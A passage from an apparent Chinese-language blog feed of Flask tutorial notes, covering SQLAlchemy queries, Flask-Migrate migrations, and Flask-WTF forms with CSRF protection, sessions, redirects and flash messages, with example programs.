class="string">u'david'</span>&gt;]</span><br></pre></td></tr></table></figure></li></ol><p>若想看到原生的SQL查询语句，需要将其转换为字符串类型即可。<br>下表列出了可在query对象上调用的常用过滤器：</p><table><thead><tr><th>滤器</th><th>说明</th></tr></thead><tbody><tr><td>filter()</td><td>把过滤器添加到原查询上，返回一个新查询</td></tr><tr><td>filter_by()</td><td>把等值过滤器添加到原查询上，返回一个新查询</td></tr><tr><td>limit()</td><td>使用指定的值限制原查询返回的结果数量，返回一个新查询</td></tr><tr><td>offset()</td><td>偏移原查询返回的结果，返回一个新查询</td></tr><tr><td>order_by()</td><td>根据指定条件对原查询结果进行排序，返回一个新查询</td></tr><tr><td>group_by()</td><td>根据指定条件对原查询结果进行分组，返回一个新查询</td></tr></tbody></table><p>在查询上应用指定的过滤器后，通过调用all()执行查询，以列表的形式返回结果。除了all()之外，还有其他方法能触发查询执行。下表列出了执行查询的其他方法：</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>all()</td><td>以列表形式返回查询的所有结果</td></tr><tr><td>first()</td><td>返回查询的第一个结果，如果没有结果，则返回None</td></tr><tr><td>first_or_404()</td><td>返回查询的第一个结果，如果没有结果，则终止请求，返回404错误响应</td></tr><tr><td>get()</td><td>返回指定主键对应的行，如果没有对应的行，则返回None</td></tr><tr><td>get_or_404()</td><td>返回指定主键对应的行，如果没找到指定的主键，则终止请求，返回404错误响应</td></tr><tr><td>count()</td><td>返回查询结果的数量</td></tr><tr><td>paginate()</td><td>返回一个Paginate对象，它包含指定范围内的结果</td></tr></tbody></table><hr><h3 id="使用Flask-Migrate实现数据库迁移"><a href="#使用Flask-Migrate实现数据库迁移" class="headerlink" title="使用Flask-Migrate实现数据库迁移"></a>使用Flask-Migrate实现数据库迁移</h3><p>在开发程序的过程中，你会发现有时需要修改数据库模型，而且修改之后还需要更新数据库。仅当数据库表不存在时，Flask-SQLAlchemy才会根据模型进行创建。因此，更新表的唯一方式就是先删除旧表，不过这样做会丢失数据库中的所有数据。<br>更新表的更好方法是使用<strong>数据库迁移框架</strong>。源码版本控制工具可以跟踪源码文件的变化，类似地，数据库迁移框架能跟踪数据库模式的变化，然后增量式的把变化应用到数据库中。</p><p>安装此扩展:<code>pip install flask-migrate</code></p><p>使用方法如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask.ext.migrate <span class="keyword">import</span> Migrate, MigrateCommand</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">migrate = Migrate(app, db)</span><br><span class="line">manager.add_command(<span class="string">'db'</span>, MigrateCommand)</span><br></pre></td></tr></table></figure></p><p>在维护数据库迁移之前，要使用<code>init</code>子命令创建迁移仓库：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(venv) $ python hello.py db init</span><br><span class="line">Creating directory /home/flask/flasky/migrations...done</span><br><span class="line">Creating directory /home/flask/flasky/migrations/versions...done</span><br><span class="line">Generating /home/flask/flasky/migrations/alembic.ini...done</span><br><span class="line">Generating /home/flask/flasky/migrations/env.py...done</span><br><span class="line">Generating /home/flask/flasky/migrations/env.pyc...done</span><br><span class="line">Generating /home/flask/flasky/migrations/README...done</span><br><span class="line">Generating /home/flask/flasky/migrations/script.py.mako...done</span><br><span class="line">Please edit configuration/connection/logging settings <span class="keyword">in</span></span><br><span class="line"><span class="string">'/home/flask/flasky/migrations/alembic.ini'</span> before proceeding.</span><br></pre></td></tr></table></figure></p><p>这个命令会创建<code>migrations</code>文件夹，所有迁移脚本都存放其中。</p><p>数据库迁移用<strong>迁移脚本</strong>表示。脚本中有两个函数，分别是<code>upgrade()</code>和<code>downgrade()</code>。upgrade()函数把迁移中的改动应用到数据库中，downgrade()函数则将改动删除。</p><p>使用migrate命令自动创建，手动创建的迁移只是一个骨架，upgrade()和downgrade()函数都是空的。<br>migrate子命令用来自动创建迁移脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(venv) $ python hello.py db migrate -m <span class="string">"initial migration"</span></span><br><span class="line">INFO [alembic.migration] Context impl SQLiteImpl.</span><br><span class="line">INFO [alembic.migration] Will assume non-transactional DDL.</span><br><span class="line">INFO [alembic.autogenerate] Detected added table <span class="string">'roles'</span></span><br><span class="line">INFO [alembic.autogenerate] Detected added table <span class="string">'users'</span></span><br><span class="line">INFO [alembic.autogenerate.compare] Detected added index</span><br><span class="line"><span class="string">'ix_users_username'</span> on <span class="string">'['</span>username<span class="string">']'</span></span><br><span class="line">Generating /home/flask/flasky/migrations/versions/<span class="number">1</span>bc</span><br><span class="line"><span class="number">594146</span>bb5_initial_migration.py...done</span><br></pre></td></tr></table></figure></p><p>我们可以使用db upgrade命令把迁移应用到数据库中：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(venv) $ python hello.py db upgrade</span><br><span class="line">INFO [alembic.migration] Context impl SQLiteImpl.</span><br><span class="line">INFO [alembic.migration] Will assume non-transactional DDL.</span><br><span class="line">INFO [alembic.migration] Running upgrade None -&gt; 1bc594146bb5, initial migration</span><br></pre></td></tr></table></figure></p><h3 id="本章完整程序"><a href="#本章完整程序" class="headerlink" title="本章完整程序"></a>本章完整程序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, session, redirect, url_for</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">from</span> flask_moment <span class="keyword">import</span> Moment</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">basedir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'hard to guess string'</span></span><br><span class="line">app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] =\</span><br><span class="line">    <span class="string">'sqlite:///'</span> + os.path.join(basedir, <span class="string">'data.sqlite'</span>)</span><br><span class="line">app.config[<span class="string">'SQLALCHEMY_TRACK_MODIFICATIONS'</span>] = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line">moment = Moment(app)</span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Role</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'roles'</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="keyword">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">64</span>), unique=<span class="keyword">True</span>)</span><br><span class="line">    users = db.relationship(<span class="string">'User'</span>, backref=<span class="string">'role'</span>, lazy=<span class="string">'dynamic'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;Role %r&gt;'</span> % self.name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'users'</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="keyword">True</span>)</span><br><span class="line">    username = db.Column(db.String(<span class="number">64</span>), unique=<span class="keyword">True</span>, index=<span class="keyword">True</span>)</span><br><span class="line">    role_id = db.Column(db.Integer, db.ForeignKey(<span class="string">'roles.id'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;User %r&gt;'</span> % self.username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    name = StringField(<span class="string">'What is your name?'</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.shell_context_processor</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_shell_context</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> dict(db=db, User=User, Role=Role)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'404.html'</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(500)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">internal_server_error</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'500.html'</span>), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        user = User.query.filter_by(username=form.name.data).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            user = User(username=form.name.data)</span><br><span class="line">            db.session.add(user)</span><br><span class="line">            db.session.commit()</span><br><span class="line">            session[<span class="string">'known'</span>] = <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">'known'</span>] = <span class="keyword">True</span></span><br><span class="line">        session[<span class="string">'name'</span>] = form.name.data</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form, name=session.get(<span class="string">'name'</span>),</span><br><span class="line">                           known=session.get(<span class="string">'known'</span>, <span class="keyword">False</span>))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask之Web表单</title>
      <link href="/2019/01/24/flask%E4%B9%8BWeb%E8%A1%A8%E5%8D%95/"/>
      <url>/2019/01/24/flask%E4%B9%8BWeb%E8%A1%A8%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<p>flask深入学习之第三部分<br><a id="more"></a></p><h1 id="Web表单"><a href="#Web表单" class="headerlink" title="Web表单"></a>Web表单</h1><blockquote><p>为了增强安全性，密钥不应该直接写入代码，而要保存在环境变量中。</p></blockquote><h3 id="抵御csrf"><a href="#抵御csrf" class="headerlink" title="抵御csrf"></a>抵御csrf</h3><p>Flask-WTF能保护所有表单免受跨站请求伪造（Cross-Site Request Forgery，CSRF）的攻击。恶意网站把请求发送到被攻击者已登录的其他网站时就会引发CSRF攻击。为了实现CSRF保护，Flask-WTF需要程序设置一个密钥。Flask-WTF使用这个密钥生成加密令牌，再用令牌验证请求中表单数据的真伪。设置密钥的方法如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'hard to guess string'</span></span><br></pre></td></tr></table></figure></p><p><strong>app.config字典可用来存储框架、扩展和程序本身的配置变量</strong>，SECRET_KEY配置变量是通用密钥，可在Flask和多个第三方扩展中使用。如其名所示，加密的强度取决于变量值的机密程度。不同的程序要使用不同的密钥，而且要保证其他人不知道你所用的字符串。</p><p><code>pip install flask-wtf</code>安装flask-wtf</p><hr><h3 id="表单类"><a href="#表单类" class="headerlink" title="表单类"></a>表单类</h3><p>使用Flask-WTF时，每个Web表单都由一个继承自<code>Form</code>的类表示。这个类定义表单中的一组字段，每个字段都用对象表示。字段对象可附属一个或多个验证函数。验证函数用来验证用户提交的输入值是否符合要求。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask.ext.wtf <span class="keyword">import</span> Form</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> Required</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span><span class="params">(Form)</span>:</span></span><br><span class="line">    name = StringField(<span class="string">'What is your name?'</span>, validators=[Required()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br></pre></td></tr></table></figure></p><p>在上面的实例中，<code>NameForm</code>表单中有一个名为<code>name</code>的文本字段和一个名为<code>submit</code>的提交按钮。<strong>StringField类表示属性为type=”text”的<code>&lt;input&gt;</code>元素</strong>。<strong>SubmitField类表示属性为type=”submit”的<code>&lt;input&gt;</code>元素</strong>。字段构造函数的第一个参数是把表单渲染成HTML时使用的标号。<code>StringField</code>构造函数中的可选参数<code>validators</code>指定一个由验证函数组成的列表，在接受用户提交的数据之前验证数据。验证函数<code>Required()</code>确保提交的字段不为空。</p><blockquote><p>Form基类由Flask-WTF扩展定义，所以从flask.ext.wtf中导入。字段和验证函数却可以直接从WTForms包中导入。</p></blockquote><p>WTForms支持的HTML字段如下：</p><table><thead><tr><th>字段类型</th><th>说明</th></tr></thead><tbody><tr><td>StringField</td><td>文本字段</td></tr><tr><td>TextAreaField</td><td>多行文本字段</td></tr><tr><td>PasswordField</td><td>密码文本字段</td></tr><tr><td>HiddenField</td><td>隐藏文本字段</td></tr><tr><td>DateField</td><td>文本字段，值为datetime.date格式</td></tr><tr><td>DateTimeField</td><td>文本字段，值为datetime.datetime格式</td></tr><tr><td>IntegerField</td><td>文本字段，值为整数</td></tr><tr><td>DecimalField</td><td>文本字段，值为decimal.Decimal</td></tr><tr><td>FloatField</td><td>文本字段，值为浮点数</td></tr><tr><td>BooleanField</td><td>复选框，值为True和False</td></tr><tr><td>RadioField</td><td>一组单选框</td></tr><tr><td>SelectField</td><td>下拉列表</td></tr><tr><td>SelectMultipleField</td><td>下拉列表，可选择多个值</td></tr><tr><td>FileField</td><td>文件上传字段</td></tr><tr><td>SubmitField</td><td>表单提交按钮</td></tr><tr><td>FormField</td><td>把表单作为字段嵌入另一个表单</td></tr><tr><td>FieldList</td><td>组指定类型的字段</td></tr></tbody></table><p>WTForms包含的验证函数：</p><table><thead><tr><th>验证函数</th><th>说明</th></tr></thead><tbody><tr><td>Email</td><td>验证电子邮件地址</td></tr><tr><td>EqualTo</td><td>比较两个字段的值；常用于要求输入两次密码进行确认的情况</td></tr><tr><td>IPAddress</td><td>验证IPv4网络地址</td></tr><tr><td>Length</td><td>验证输入字符串的长度</td></tr><tr><td>NumberRange</td><td>验证输入的值在数字范围内</td></tr><tr><td>Optional</td><td>无输入值时跳过其他验证函数</td></tr><tr><td>Required</td><td>确保字段中有数据</td></tr><tr><td>Regexp</td><td>使用正则表达式验证输入值</td></tr><tr><td>URL</td><td>验证URL</td></tr><tr><td>AnyOf</td><td>确保输入值在可选值列表中</td></tr><tr><td>NoneOf</td><td>确保输入值不在可选值列表中</td></tr></tbody></table><hr><h3 id="将表单渲染成HTML"><a href="#将表单渲染成HTML" class="headerlink" title="将表单渲染成HTML"></a>将表单渲染成HTML</h3><p><code>Flask-Bootstrap</code>提供了一个非常高端的辅助函数，可以使用Bootstrap中预先定义好的表单样式渲染整个Flask-WTF表单，而这些操作只需一次调用即可完成。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">import</span> <span class="string">"bootstrap/wtf.html"</span> <span class="keyword">as</span> wtf %&#125;</span><br><span class="line">&#123;&#123; wtf.quick_form(form) &#125;&#125;</span><br></pre></td></tr></table></figure></p><p><code>import指令</code>的使用方法和普通Python代码一样，允许导入模板中的元素并用在多个模板中。导入的<code>bootstrap/wtf.html</code>文件中定义了一个使用Bootstrap渲染Falsk-WTF表单对象的辅助函数。<code>wtf.quick_form()</code>函数的参数为Flask-WTF表单对象，使用Bootstrap的默认样式渲染传入的表单。</p><hr><h3 id="在视图函数中处理表单"><a href="#在视图函数中处理表单" class="headerlink" title="在视图函数中处理表单"></a>在视图函数中处理表单</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = <span class="keyword">None</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        name = form.name.data</span><br><span class="line">        form.name.data = <span class="string">''</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form, name=name)</span><br></pre></td></tr></table></figure><p><code>app.route</code>修饰器中添加的methods参数告诉Flask在URL映射中把这个视图函数注册为GET和POST请求的处理程序。如果没指定methods参数，就只把视图函数注册为GET请求的处理程序。<br>局部变量<code>name</code>用来存放表单中输入的有效名字，如果没有输入，其值为None。如上述代码所示，在视图函数中创建一个NameForm类实例用于表示表单。提交表单后，如果数据能被所有验证函数接受，那么<code>validate_on_submit()</code>方法的返回值为True，否则返回False。这个函数的返回值决定是重新渲染表单还是处理表单提交的数据。</p><p>用户第一次访问程序时，服务器会收到一个没有表单数据的GET请求，所以<code>validate_on_submit()</code>将返回False。if语句的内容将被跳过，通过渲染模板处理请求，并传入表单对象和值为None的name变量作为参数。用户会看到浏览器中显示了一个表单。用户提交表单后，服务器收到一个包含数据的POST请求。<code>validate_on_submit()</code>会调用name字段上附属的Required()验证函数。如果名字不为空，就能通过验证，<code>validate_on_submit()</code>返回True。现在，用户输入的名字可通过字段的data属性获取。在if语句中，把名字赋值给局部变量name，然后再把data属性设为空字符串，从而清空表单字段。最后一行调用<code>render_template()</code>函数渲染模板，但这一次参数name的值为表单中输入的名字，因此会显示一个针对该用户的欢迎消息。</p><hr><h3 id="重定向和用户会话"><a href="#重定向和用户会话" class="headerlink" title="重定向和用户会话"></a>重定向和用户会话</h3><p>用户输入名字后提交表单，然后点击浏览器的刷新按钮，会看到一个莫名其妙的警告，要求在再次提交表单之前进行确认。之所以出现这种情况，是因为刷新页面时浏览器会重新发送之前已经发送过的最后一个请求。如果这个请求是一个包含表单数据的POST请求，刷新页面后会再次提交表单。大多数情况下，这并不是理想的处理方式。(使用CHORME浏览器进行尝试)</p><blockquote><p>基于这个原因，最好别让Web程序把POST请求作为浏览器发送的最后一个请求。</p></blockquote><p>这种需求的实现方式是，使用<strong>重定向</strong>作为POST请求的响应，而不是使用常规响应。重定向是一种特殊的响应，响应内容是URL，而不是包含HTML代码的字符串。浏览器收到这种响应时，会向重定向的URL发起GET请求，显示页面的内容。这个页面的加载可能要多花几微秒，因为要先把第二个请求发给服务器。除此之外，用户不会察觉到有什么不同。现在，最后一个请求是GET请求，所以刷新命令能像预期的那样正常使用了。这个技巧称为<strong>Post/重定向/Get</strong>模式。</p><p>但是这种重定向也有一些弊端，其无法保存用户所输入的信息，无法形成<strong>会话</strong>，因此需要导入session保存用户输入的信息。下例就使用了session保存信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, session, redirect, url_for</span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        session[<span class="string">'name'</span>] = form.name.data</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form, name=session.get(<span class="string">'name'</span>))</span><br></pre></td></tr></table></figure><p><code>session[&#39;name&#39;]</code>，在两次请求之间也能记住输入的值。其中包含合法表单数据的请求最后会调用<code>redirect()</code>函数。redirect()是个辅助函数，用来生成HTTP重定向响应。<strong>redirect()函数的参数是重定向的URL，这里使用的重定向URL是程序的根地址，因此重定向响应本可以写得更简单一些，写成redirect(‘/‘)，但却会使用Flask提供的URL生成函数<code>url_for()</code></strong>。推荐使用<code>url_for()</code>生成URL，因为这个函数使用URL映射生成URL，从而保证URL和定义的路由兼容，而且修改路由名字后依然可用。<br><code>url_for()</code>函数的第一个且唯一必须指定的参数是<strong>端点名</strong>，即路由的内部名字。默认情况下，路由的端点是相应视图函数的名字。在这个示例中，处理根地址的视图函数是index()，因此传给url_for()函数的名字是index。<br><code>render_template()</code>函数中，使用<code>session.get(&#39;name&#39;)</code>直接从会话中读取name参数的值。和普通的字典一样，这里使用get()获取字典中键对应的值以避免未找到键的异常情况，因为对于不存在的键，get()会返回默认值None。</p><hr><h3 id="Flash消息"><a href="#Flash消息" class="headerlink" title="Flash消息"></a>Flash消息</h3><p>请求完成后，有时需要让用户知道状态发生了变化。这里可以使用确认消息、警告或者错误提醒。一个典型例子是，用户提交了有一项错误的登录表单后，服务器发回的响应重新渲染了登录表单，并在表单上面显示一个消息，提示用户用户名或密码错误。<code>flash()</code>函数可实现这种效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, session, redirect, url_for, flash</span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        old_name = session.get(<span class="string">'name'</span>)</span><br><span class="line">        <span class="keyword">if</span> old_name <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> old_name != form.name.data:</span><br><span class="line">            flash(<span class="string">'Looks like you have changed your name!'</span>)</span><br><span class="line">        session[<span class="string">'name'</span>] = form.name.data</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,form = form, name = session.get(<span class="string">'name'</span>))</span><br></pre></td></tr></table></figure><p>在这个示例中，每次提交的名字都会和存储在用户会话中的名字进行比较，而会话中存储的名字是前一次在这个表单中提交的数据。如果两个名字不一样，就会调用<code>flash()</code>函数，在发给客户端的下一个响应中显示一个消息。在这个示例中，每次提交的名字都会和存储在用户会话中的名字进行比较，而会话中存储的名字是前一次在这个表单中提交的数据。如果两个名字不一样，就会调用<code>flash()</code>函数，在发给客户端的下一个响应中显示一个消息。<br>仅调用flash()函数并不能把消息显示出来，程序使用的模板要渲染这些消息。最好在基模板中渲染Flash消息，因为这样所有页面都能使用这些消息。Flask把<code>get_flashed_messages()</code>函数开放给模板，用来获取并渲染消息。</p><p>这一章的完整程序：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, session, redirect, url_for, flash</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">from</span> flask_moment <span class="keyword">import</span> Moment</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'hard to guess string'</span></span><br><span class="line"></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line">moment = Moment(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    name = StringField(<span class="string">'What is your name?'</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'404.html'</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(500)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">internal_server_error</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span 